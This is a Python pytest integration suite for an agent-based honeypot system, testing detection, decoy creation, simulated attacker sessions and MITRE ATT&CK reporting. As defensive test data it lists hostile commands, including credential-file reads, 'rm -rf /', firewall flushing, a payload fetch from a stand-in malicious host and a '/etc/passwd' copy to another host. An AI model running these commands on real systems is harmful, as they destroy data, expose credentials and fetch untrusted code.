"""
Comprehensive End-to-End Integration Tests for AI Honeypot System
Tests complete workflows from threat detection to intelligence reporting
"""

import pytest
import pytest_asyncio
import asyncio
import time
import statistics
from unittest.mock import AsyncMock, MagicMock, patch
from datetime import datetime, timedelta
from typing import Dict, List, Any

from agents.detection.detection_agent import DetectionAgent
from agents.coordinator.coordinator_agent import CoordinatorAgent
from agents.interaction.interaction_agent import InteractionAgent
from agents.intelligence.intelligence_agent import IntelligenceAgent
from config.agentcore_sdk import AgentCoreSDK, Message


@pytest.mark.integration
@pytest.mark.e2e
@pytest.mark.asyncio
class TestComprehensiveE2E:
    """Comprehensive end-to-end integration tests"""

    @pytest_asyncio.fixture
    async def e2e_system(self, test_config):
        """Setup complete system for end-to-end testing"""
        config = {
            **test_config,
            "use_mock_ai": True,
            "performance_mode": True,
            "comprehensive_logging": True
        }
        
        # Initialize all agents
        detection = DetectionAgent(config=config)
        coordinator = CoordinatorAgent(config=config)
        interaction = InteractionAgent(config=config)
        intelligence = IntelligenceAgent(config=config)
        
        # Mock AgentCore SDK for all agents
        mock_sdk = AsyncMock(spec=AgentCoreSDK)
        detection.sdk = mock_sdk
        coordinator.sdk = mock_sdk
        interaction.sdk = mock_sdk
        intelligence.sdk = mock_sdk
        
        # Start all agents
        await detection.start()
        await coordinator.start()
        await interaction.start()
        await intelligence.start()
        
        system = {
            "detection": detection,
            "coordinator": coordinator,
            "interaction": interaction,
            "intelligence": intelligence,
            "sdk": mock_sdk,
            "active_honeypots": {},
            "active_sessions": {},
            "test_metrics": {
                "start_time": datetime.utcnow(),
                "operations_count": 0,
                "errors_count": 0
            }
        }
        
        yield system
        
        # Comprehensive cleanup
        await self._cleanup_system(system)

    async def _cleanup_system(self, system):
        """Comprehensive system cleanup"""
        try:
            # Destroy all active honeypots
            for hp_id in list(system["active_honeypots"].keys()):
                await system["coordinator"].destroy_honeypot(hp_id)
            
            # Terminate all active sessions
            for session_id in list(system["active_sessions"].keys()):
                await system["interaction"].terminate_session(session_id)
            
            # Stop all agents
            await system["detection"].stop()
            await system["coordinator"].stop()
            await system["interaction"].stop()
            await system["intelligence"].stop()
            
        except Exception as e:
            print(f"Cleanup error: {e}")

    async def test_complete_threat_lifecycle_ssh(self, e2e_system):
        """Test complete threat lifecycle for SSH honeypot"""
        detection = e2e_system["detection"]
        coordinator = e2e_system["coordinator"]
        interaction = e2e_system["interaction"]
        intelligence = e2e_system["intelligence"]
        
        # Phase 1: Threat Detection
        threat_data = {
            "source_ip": "192.168.1.100",
            "destination_ip": "10.0.0.50",
            "threat_type": "ssh_brute_force",
            "indicators": ["multiple_failed_logins", "credential_stuffing"],
            "confidence": 0.87,
            "timestamp": datetime.utcnow().isoformat(),
            "metadata": {
                "failed_attempts": 15,
                "time_window": "5_minutes",
                "user_agents": ["ssh-2.0-libssh"],
                "attack_pattern": "dictionary_attack"
            }
        }
        
        detection_result = await detection.analyze_threat(threat_data)
        
        assert detection_result["engagement_decision"] is True
        assert detection_result["confidence_score"] >= 0.8
        assert "threat_classification" in detection_result
        
        # Phase 2: Honeypot Creation and Configuration
        honeypot_request = {
            "threat_data": threat_data,
            "honeypot_type": "ssh",
            "priority": "high",
            "configuration": {
                "port": 2222,
                "banner": "OpenSSH_8.2p1 Ubuntu-4ubuntu0.5",
                "max_sessions": 5,
                "session_timeout": 1800,
                "synthetic_users": ["admin", "user", "service", "backup"],
                "fake_filesystem": True,
                "command_simulation": True
            }
        }
        
        honeypot_result = await coordinator.create_honeypot(honeypot_request)
        
        assert honeypot_result["status"] == "created"
        assert "honeypot_id" in honeypot_result
        
        honeypot_id = honeypot_result["honeypot_id"]
        e2e_system["active_honeypots"][honeypot_id] = honeypot_result
        
        # Verify honeypot is active
        status = await coordinator.get_honeypot_status(honeypot_id)
        assert status["status"] == "active"
        
        # Phase 3: Attacker Interaction Simulation
        session_data = {
            "session_id": f"e2e-session-{honeypot_id}",
            "honeypot_id": honeypot_id,
            "attacker_ip": threat_data["source_ip"],
            "honeypot_type": "ssh",
            "start_time": datetime.utcnow().isoformat()
        }
        
        e2e_system["active_sessions"][session_data["session_id"]] = session_data
        
        # Simulate realistic SSH attack sequence
        attack_sequence = [
            # Initial reconnaissance
            {"command": "whoami", "expected_response": "root"},
            {"command": "id", "expected_response": "uid=0(root)"},
            {"command": "uname -a", "expected_response": "Linux"},
            
            # System enumeration
            {"command": "ps aux", "expected_response": "PID"},
            {"command": "netstat -an", "expected_response": "tcp"},
            {"command": "ls -la /etc", "expected_response": "passwd"},
            
            # Privilege escalation attempts
            {"command": "cat /etc/passwd", "expected_response": "root:x:0:0"},
            {"command": "cat /etc/shadow", "expected_response": "Permission denied"},
            {"command": "sudo -l", "expected_response": "sudo"},
            
            # Lateral movement preparation
            {"command": "ssh-keygen -t rsa", "expected_response": "Generating"},
            {"command": "cat ~/.ssh/id_rsa.pub", "expected_response": "ssh-rsa"},
            {"command": "ping -c 3 192.168.1.1", "expected_response": "PING"},
            
            # Data discovery
            {"command": "find /home -name '*.txt'", "expected_response": "/home"},
            {"command": "locate password", "expected_response": "locate:"},
            {"command": "grep -r 'password' /etc/", "expected_response": "grep:"}
        ]
        
        session_transcript = []
        
        for step in attack_sequence:
            command = step["command"]
            expected = step["expected_response"]
            
            response = await interaction.simulate_command(
                session_data["session_id"], command
            )
            
            # Verify response quality
            assert isinstance(response, str)
            assert len(response) > 0
            
            # Check if response contains expected elements
            if expected in response or any(word in response.lower() for word in expected.lower().split()):
                response_quality = "good"
            else:
                response_quality = "acceptable"
            
            interaction_record = {
                "timestamp": datetime.utcnow().isoformat(),
                "command": command,
                "response": response,
                "response_quality": response_quality,
                "synthetic": True,
                "technique_indicators": self._identify_technique_indicators(command)
            }
            
            session_transcript.append(interaction_record)
        
        session_data["interactions"] = session_transcript
        session_data["end_time"] = datetime.utcnow().isoformat()
        session_data["total_commands"] = len(attack_sequence)
        
        # Phase 4: Intelligence Analysis
        intelligence_result = await intelligence.analyze_session(session_data)
        
        assert "techniques_identified" in intelligence_result
        assert "confidence_score" in intelligence_result
        assert intelligence_result["confidence_score"] > 0.0
        assert len(intelligence_result["techniques_identified"]) > 0
        
        # Verify MITRE ATT&CK mapping
        mitre_mapping = await intelligence.map_to_mitre_attack(session_data)
        
        assert "tactics" in mitre_mapping
        assert "techniques" in mitre_mapping
        assert len(mitre_mapping["techniques"]) > 0
        
        # Expected techniques for SSH attack
        expected_techniques = ["T1078", "T1082", "T1033", "T1057", "T1049"]
        identified_techniques = [t["technique_id"] for t in mitre_mapping["techniques"]]
        
        # Should identify at least some expected techniques
        overlap = set(expected_techniques) & set(identified_techniques)
        assert len(overlap) >= 2
        
        # Phase 5: Intelligence Report Generation
        final_report = await intelligence.generate_intelligence_report(session_data)
        
        assert "report_id" in final_report
        assert "session_id" in final_report
        assert "threat_assessment" in final_report
        assert "mitre_techniques" in final_report
        assert "iocs" in final_report
        assert "recommendations" in final_report
        
        # Verify report quality
        assert final_report["confidence_assessment"]["overall_confidence"] > 0.5
        assert len(final_report["mitre_techniques"]) > 0
        assert len(final_report["iocs"]) > 0
        
        # Phase 6: System Cleanup and Verification
        cleanup_result = await coordinator.destroy_honeypot(honeypot_id)
        assert cleanup_result["status"] == "destroyed"
        
        # Verify complete workflow metrics
        assert len(session_transcript) == len(attack_sequence)
        assert all(record["synthetic"] for record in session_transcript)
        
        # Update test metrics
        e2e_system["test_metrics"]["operations_count"] += 1

    def _identify_technique_indicators(self, command: str) -> List[str]:
        """Identify MITRE ATT&CK technique indicators in commands"""
        indicators = []
        
        technique_patterns = {
            "T1078": ["whoami", "id", "groups"],  # Valid Accounts
            "T1082": ["uname", "hostname", "cat /etc/os-release"],  # System Information Discovery
            "T1033": ["whoami", "id", "w", "who"],  # System Owner/User Discovery
            "T1057": ["ps", "top", "pgrep"],  # Process Discovery
            "T1049": ["netstat", "ss", "lsof"],  # System Network Connections Discovery
            "T1083": ["ls", "find", "locate"],  # File and Directory Discovery
            "T1003": ["cat /etc/passwd", "cat /etc/shadow"],  # OS Credential Dumping
            "T1021": ["ssh", "scp", "rsync"],  # Remote Services
            "T1059": ["bash", "sh", "/bin/"],  # Command and Scripting Interpreter
        }
        
        for technique_id, patterns in technique_patterns.items():
            if any(pattern in command.lower() for pattern in patterns):
                indicators.append(technique_id)
        
        return indicators

    async def test_multi_honeypot_coordinated_attack(self, e2e_system):
        """Test coordinated attack across multiple honeypot types"""
        coordinator = e2e_system["coordinator"]
        interaction = e2e_system["interaction"]
        intelligence = e2e_system["intelligence"]
        
        # Create multiple honeypot types
        honeypot_configs = [
            {
                "type": "web_admin",
                "port": 8080,
                "threat_data": {"source_ip": "192.168.1.100", "threat_type": "web_attack"}
            },
            {
                "type": "ssh", 
                "port": 2222,
                "threat_data": {"source_ip": "192.168.1.100", "threat_type": "ssh_brute_force"}
            },
            {
                "type": "database",
                "port": 3306,
                "threat_data": {"source_ip": "192.168.1.100", "threat_type": "sql_injection"}
            }
        ]
        
        created_honeypots = []
        
        # Create all honeypots
        for config in honeypot_configs:
            request = {
                "threat_data": config["threat_data"],
                "honeypot_type": config["type"],
                "configuration": {"port": config["port"]}
            }
            
            result = await coordinator.create_honeypot(request)
            assert result["status"] == "created"
            
            created_honeypots.append(result)
            e2e_system["active_honeypots"][result["honeypot_id"]] = result
        
        # Simulate coordinated attack phases
        attack_phases = [
            {
                "phase": "reconnaissance",
                "honeypot_type": "web_admin",
                "actions": [
                    {"action": "login_attempt", "data": {"username": "admin", "password": "admin"}},
                    {"action": "directory_traversal", "data": {"path": "../../../etc/passwd"}},
                    {"action": "user_enumeration", "data": {"endpoint": "/api/users"}}
                ]
            },
            {
                "phase": "lateral_movement",
                "honeypot_type": "ssh",
                "actions": [
                    {"action": "command", "data": {"cmd": "ssh admin@database-server"}},
                    {"action": "command", "data": {"cmd": "scp /etc/passwd backup@file-server:/tmp/"}},
                    {"action": "command", "data": {"cmd": "nmap -sS 192.168.1.0/24"}}
                ]
            },
            {
                "phase": "data_access",
                "honeypot_type": "database",
                "actions": [
                    {"action": "query", "data": {"sql": "SELECT * FROM users"}},
                    {"action": "query", "data": {"sql": "SHOW DATABASES"}},
                    {"action": "query", "data": {"sql": "SELECT * FROM sensitive_data LIMIT 100"}}
                ]
            }
        ]
        
        phase_results = {}
        
        for phase in attack_phases:
            # Find target honeypot
            target_honeypot = next(
                hp for hp in created_honeypots 
                if hp["type"] == phase["honeypot_type"]
            )
            
            session_id = f"coordinated-{phase['phase']}-{target_honeypot['honeypot_id']}"
            e2e_system["active_sessions"][session_id] = {
                "session_id": session_id,
                "honeypot_id": target_honeypot["honeypot_id"],
                "phase": phase["phase"]
            }
            
            phase_interactions = []
            
            for action in phase["actions"]:
                if action["action"] == "login_attempt":
                    response = await interaction.simulate_login_attempt(
                        session_id, 
                        action["data"]["username"], 
                        action["data"]["password"]
                    )
                elif action["action"] == "command":
                    response = await interaction.simulate_command(
                        session_id, action["data"]["cmd"]
                    )
                elif action["action"] == "query":
                    response = await interaction.simulate_database_query(
                        session_id, action["data"]["sql"]
                    )
                elif action["action"] == "directory_traversal":
                    response = await interaction.simulate_web_request(
                        session_id, "GET", action["data"]["path"]
                    )
                elif action["action"] == "user_enumeration":
                    response = await interaction.simulate_web_request(
                        session_id, "GET", action["data"]["endpoint"]
                    )
                else:
                    response = "Action not implemented"
                
                phase_interactions.append({
                    "action": action["action"],
                    "data": action["data"],
                    "response": response,
                    "timestamp": datetime.utcnow().isoformat()
                })
            
            phase_results[phase["phase"]] = {
                "honeypot_type": phase["honeypot_type"],
                "interactions": phase_interactions,
                "session_id": session_id
            }
        
        # Analyze coordinated attack
        coordinated_analysis = await intelligence.analyze_coordinated_attack(phase_results)
        
        assert "attack_timeline" in coordinated_analysis
        assert "cross_phase_techniques" in coordinated_analysis
        assert "threat_actor_profile" in coordinated_analysis
        
        # Verify attack progression
        assert len(coordinated_analysis["attack_timeline"]) == 3
        assert coordinated_analysis["threat_actor_profile"]["sophistication_level"] in ["low", "medium", "high"]
        
        # Cleanup all honeypots
        for honeypot in created_honeypots:
            await coordinator.destroy_honeypot(honeypot["honeypot_id"])

    async def test_performance_under_concurrent_load(self, e2e_system):
        """Test system performance under concurrent load"""
        detection = e2e_system["detection"]
        coordinator = e2e_system["coordinator"]
        interaction = e2e_system["interaction"]
        
        # Generate concurrent threats
        concurrent_threats = 15
        threats = []
        
        for i in range(concurrent_threats):
            threat = {
                "source_ip": f"10.0.{i//256}.{i%256}",
                "threat_type": "brute_force_attack",
                "confidence": 0.6 + (i % 5) * 0.08,
                "indicators": ["failed_logins", "port_scan"],
                "timestamp": datetime.utcnow().isoformat()
            }
            threats.append(threat)
        
        # Measure detection performance
        detection_start = time.time()
        
        detection_tasks = [detection.analyze_threat(threat) for threat in threats]
        detection_results = await asyncio.gather(*detection_tasks)
        
        detection_time = time.time() - detection_start
        
        # Verify detection performance
        assert detection_time < 30  # Should process 15 threats in under 30 seconds
        assert len(detection_results) == concurrent_threats
        
        # Create honeypots for engaged threats
        engaged_threats = [
            (i, result) for i, result in enumerate(detection_results)
            if result["engagement_decision"]
        ]
        
        assert len(engaged_threats) > 0  # At least some should engage
        
        honeypot_creation_start = time.time()
        
        honeypot_tasks = []
        for i, result in engaged_threats[:5]:  # Limit to 5 for performance
            request = {
                "threat_data": threats[i],
                "honeypot_type": "ssh"
            }
            task = coordinator.create_honeypot(request)
            honeypot_tasks.append(task)
        
        honeypot_results = await asyncio.gather(*honeypot_tasks)
        honeypot_creation_time = time.time() - honeypot_creation_start
        
        # Verify honeypot creation performance
        assert honeypot_creation_time < 25  # Should create 5 honeypots in under 25 seconds
        assert all(result["status"] == "created" for result in honeypot_results)
        
        # Test concurrent interactions
        interaction_tasks = []
        for result in honeypot_results:
            session_id = f"perf-session-{result['honeypot_id']}"
            task = interaction.simulate_command(session_id, "whoami")
            interaction_tasks.append(task)
            
            e2e_system["active_sessions"][session_id] = {
                "session_id": session_id,
                "honeypot_id": result["honeypot_id"]
            }
        
        interaction_start = time.time()
        interaction_responses = await asyncio.gather(*interaction_tasks)
        interaction_time = time.time() - interaction_start
        
        # Verify interaction performance
        assert interaction_time < 10  # Should handle 5 concurrent interactions in under 10 seconds
        assert len(interaction_responses) == len(honeypot_results)
        assert all(isinstance(response, str) for response in interaction_responses)
        
        # Cleanup
        cleanup_tasks = [
            coordinator.destroy_honeypot(result["honeypot_id"])
            for result in honeypot_results
        ]
        await asyncio.gather(*cleanup_tasks)
        
        # Update performance metrics
        e2e_system["test_metrics"]["operations_count"] += concurrent_threats

    async def test_error_recovery_and_resilience(self, e2e_system):
        """Test system error recovery and resilience"""
        coordinator = e2e_system["coordinator"]
        interaction = e2e_system["interaction"]
        
        # Create honeypot
        request = {
            "threat_data": {"source_ip": "192.168.1.100"},
            "honeypot_type": "ssh"
        }
        
        honeypot_result = await coordinator.create_honeypot(request)
        honeypot_id = honeypot_result["honeypot_id"]
        e2e_system["active_honeypots"][honeypot_id] = honeypot_result
        
        # Test interaction failure recovery
        session_id = f"error-recovery-{honeypot_id}"
        e2e_system["active_sessions"][session_id] = {
            "session_id": session_id,
            "honeypot_id": honeypot_id
        }
        
        # Simulate various error conditions
        error_scenarios = [
            {"type": "network_timeout", "command": "ping -c 100 8.8.8.8"},
            {"type": "resource_exhaustion", "command": "dd if=/dev/zero of=/tmp/large bs=1M count=1000"},
            {"type": "invalid_command", "command": "nonexistent_command_xyz"},
            {"type": "permission_error", "command": "rm -rf /"},
            {"type": "malformed_input", "command": "echo '\x00\x01\x02'"}
        ]
        
        recovery_results = []
        
        for scenario in error_scenarios:
            try:
                response = await interaction.simulate_command(session_id, scenario["command"])
                
                # System should handle errors gracefully
                assert isinstance(response, str)
                assert len(response) > 0
                
                # Check for appropriate error handling
                error_indicators = [
                    "command not found", "permission denied", "network unreachable",
                    "resource unavailable", "invalid input", "error", "failed"
                ]
                
                has_error_handling = any(
                    indicator in response.lower() 
                    for indicator in error_indicators
                )
                
                recovery_results.append({
                    "scenario": scenario["type"],
                    "handled_gracefully": True,
                    "has_error_response": has_error_handling,
                    "response_length": len(response)
                })
                
            except Exception as e:
                # System should not crash on errors
                recovery_results.append({
                    "scenario": scenario["type"],
                    "handled_gracefully": False,
                    "error": str(e)
                })
                e2e_system["test_metrics"]["errors_count"] += 1
        
        # Verify error recovery
        graceful_handling = sum(1 for r in recovery_results if r["handled_gracefully"])
        assert graceful_handling >= len(error_scenarios) * 0.8  # 80% should be handled gracefully
        
        # Test honeypot recovery
        with patch.object(coordinator, 'check_honeypot_health') as mock_health:
            mock_health.return_value = {"status": "unhealthy", "error": "Service unavailable"}
            
            recovery_result = await coordinator.recover_failed_honeypot(honeypot_id)
            assert "recovery_action" in recovery_result
        
        # Cleanup
        await coordinator.destroy_honeypot(honeypot_id)

    async def test_security_isolation_validation(self, e2e_system):
        """Test security isolation and containment validation"""
        coordinator = e2e_system["coordinator"]
        interaction = e2e_system["interaction"]
        
        # Create honeypot with strict security
        request = {
            "threat_data": {"source_ip": "192.168.1.100"},
            "honeypot_type": "ssh",
            "security_config": {
                "isolation_level": "strict",
                "real_data_detection": True,
                "network_isolation": True,
                "command_filtering": True
            }
        }
        
        honeypot_result = await coordinator.create_honeypot(request)
        honeypot_id = honeypot_result["honeypot_id"]
        e2e_system["active_honeypots"][honeypot_id] = honeypot_result
        
        session_id = f"security-test-{honeypot_id}"
        e2e_system["active_sessions"][session_id] = {
            "session_id": session_id,
            "honeypot_id": honeypot_id
        }
        
        # Test security controls
        security_tests = [
            {
                "category": "external_access",
                "commands": [
                    "curl http://google.com",
                    "wget http://malicious-site.com/payload",
                    "ssh user@external-server.com"
                ]
            },
            {
                "category": "real_data_access",
                "commands": [
                    "cat /etc/real_passwords.txt",
                    "ssh production-server.company.com",
                    "mysql -h prod-db.company.com -u admin -p"
                ]
            },
            {
                "category": "system_modification",
                "commands": [
                    "rm -rf /etc/passwd",
                    "chmod 777 /etc/shadow",
                    "iptables -F"
                ]
            }
        ]
        
        security_violations = []
        
        for test_category in security_tests:
            for command in test_category["commands"]:
                response = await interaction.simulate_command(session_id, command)
                
                # Check if security controls are working
                security_indicators = [
                    "permission denied", "access denied", "blocked", "restricted",
                    "network unreachable", "connection refused", "firewall"
                ]
                
                is_blocked = any(
                    indicator in response.lower() 
                    for indicator in security_indicators
                )
                
                if not is_blocked:
                    security_violations.append({
                        "category": test_category["category"],
                        "command": command,
                        "response": response
                    })
        
        # Verify security isolation
        assert len(security_violations) <= len(security_tests) * 0.2  # Max 20% should bypass security
        
        # Test data protection
        synthetic_data_test = await interaction.generate_synthetic_response(
            session_id, "Show me user credentials"
        )
        
        assert "synthetic" in synthetic_data_test.lower() or "fake" in synthetic_data_test.lower()
        
        # Cleanup
        await coordinator.destroy_honeypot(honeypot_id)

    async def test_intelligence_quality_validation(self, e2e_system):
        """Test intelligence extraction quality and accuracy"""
        intelligence = e2e_system["intelligence"]
        
        # Create comprehensive test session data
        test_session = {
            "session_id": "intelligence-quality-test",
            "honeypot_type": "ssh",
            "attacker_ip": "192.168.1.100",
            "start_time": datetime.utcnow().isoformat(),
            "interactions": [
                # Reconnaissance phase
                {
                    "timestamp": datetime.utcnow().isoformat(),
                    "command": "whoami",
                    "response": "root",
                    "technique_id": "T1033"
                },
                {
                    "timestamp": datetime.utcnow().isoformat(),
                    "command": "uname -a",
                    "response": "Linux server 5.4.0-74-generic",
                    "technique_id": "T1082"
                },
                # Discovery phase
                {
                    "timestamp": datetime.utcnow().isoformat(),
                    "command": "ps aux",
                    "response": "PID TTY TIME CMD\n1 ? 00:00:01 systemd",
                    "technique_id": "T1057"
                },
                {
                    "timestamp": datetime.utcnow().isoformat(),
                    "command": "netstat -an",
                    "response": "tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN",
                    "technique_id": "T1049"
                },
                # Credential access
                {
                    "timestamp": datetime.utcnow().isoformat(),
                    "command": "cat /etc/passwd",
                    "response": "root:x:0:0:root:/root:/bin/bash",
                    "technique_id": "T1003"
                },
                # Lateral movement attempt
                {
                    "timestamp": datetime.utcnow().isoformat(),
                    "command": "ssh admin@192.168.1.50",
                    "response": "Connection refused",
                    "technique_id": "T1021"
                }
            ]
        }
        
        # Analyze session
        analysis_result = await intelligence.analyze_session(test_session)
        
        # Verify analysis quality
        assert "techniques_identified" in analysis_result
        assert "confidence_score" in analysis_result
        assert analysis_result["confidence_score"] >= 0.7
        
        # Check technique identification accuracy
        expected_techniques = ["T1033", "T1082", "T1057", "T1049", "T1003", "T1021"]
        identified_techniques = [t["technique_id"] for t in analysis_result["techniques_identified"]]
        
        # Should identify most techniques correctly
        accuracy = len(set(expected_techniques) & set(identified_techniques)) / len(expected_techniques)
        assert accuracy >= 0.8  # 80% accuracy
        
        # Test MITRE mapping
        mitre_mapping = await intelligence.map_to_mitre_attack(test_session)
        
        assert "tactics" in mitre_mapping
        assert "techniques" in mitre_mapping
        
        # Verify tactic mapping
        expected_tactics = ["Discovery", "Credential Access", "Lateral Movement"]
        identified_tactics = [t["tactic"] for t in mitre_mapping["tactics"]]
        
        tactic_overlap = set(expected_tactics) & set(identified_tactics)
        assert len(tactic_overlap) >= 2
        
        # Generate intelligence report
        report = await intelligence.generate_intelligence_report(test_session)
        
        # Verify report completeness
        required_fields = [
            "report_id", "session_id", "threat_assessment", 
            "mitre_techniques", "iocs", "recommendations"
        ]
        
        for field in required_fields:
            assert field in report
        
        # Verify report quality
        assert len(report["mitre_techniques"]) >= 4
        assert len(report["iocs"]) >= 2
        assert len(report["recommendations"]) >= 3
        assert report["confidence_assessment"]["overall_confidence"] >= 0.7

    async def test_system_scalability_limits(self, e2e_system):
        """Test system behavior at scalability limits"""
        coordinator = e2e_system["coordinator"]
        
        # Test maximum honeypot creation
        max_honeypots = 10  # Reasonable limit for testing
        created_honeypots = []
        
        for i in range(max_honeypots + 2):  # Try to exceed limit
            request = {
                "threat_data": {"source_ip": f"192.168.1.{100 + i}"},
                "honeypot_type": "ssh"
            }
            
            result = await coordinator.create_honeypot(request)
            
            if result and result.get("status") == "created":
                created_honeypots.append(result["honeypot_id"])
                e2e_system["active_honeypots"][result["honeypot_id"]] = result
            else:
                # Should gracefully handle limit exceeded
                assert i >= max_honeypots  # Should only fail after reaching limit
        
        # Verify system handled limits gracefully
        assert len(created_honeypots) <= max_honeypots
        
        # Test resource allocation under stress
        resource_status = await coordinator.get_system_resource_status()
        
        assert "total_honeypots" in resource_status
        assert "resource_utilization" in resource_status
        
        # Cleanup all honeypots
        cleanup_tasks = [
            coordinator.destroy_honeypot(hp_id) for hp_id in created_honeypots
        ]
        await asyncio.gather(*cleanup_tasks)

    async def test_end_to_end_metrics_collection(self, e2e_system):
        """Test comprehensive metrics collection throughout E2E workflow"""
        # Calculate test execution metrics
        start_time = e2e_system["test_metrics"]["start_time"]
        end_time = datetime.utcnow()
        total_duration = (end_time - start_time).total_seconds()
        
        operations_count = e2e_system["test_metrics"]["operations_count"]
        errors_count = e2e_system["test_metrics"]["errors_count"]
        
        # Verify system performance metrics
        assert total_duration > 0
        assert operations_count > 0
        
        # Calculate success rate
        if operations_count > 0:
            success_rate = (operations_count - errors_count) / operations_count
            assert success_rate >= 0.8  # 80% success rate minimum
        
        # Verify system health
        system_health = {
            "total_test_duration": total_duration,
            "operations_completed": operations_count,
            "errors_encountered": errors_count,
            "success_rate": success_rate if operations_count > 0 else 1.0,
            "active_honeypots": len(e2e_system["active_honeypots"]),
            "active_sessions": len(e2e_system["active_sessions"])
        }
        
        # Log final metrics
        print(f"E2E Test Metrics: {system_health}")
        
        # Verify no resource leaks
        assert len(e2e_system["active_honeypots"]) == 0  # Should be cleaned up
        assert len(e2e_system["active_sessions"]) == 0   # Should be cleaned up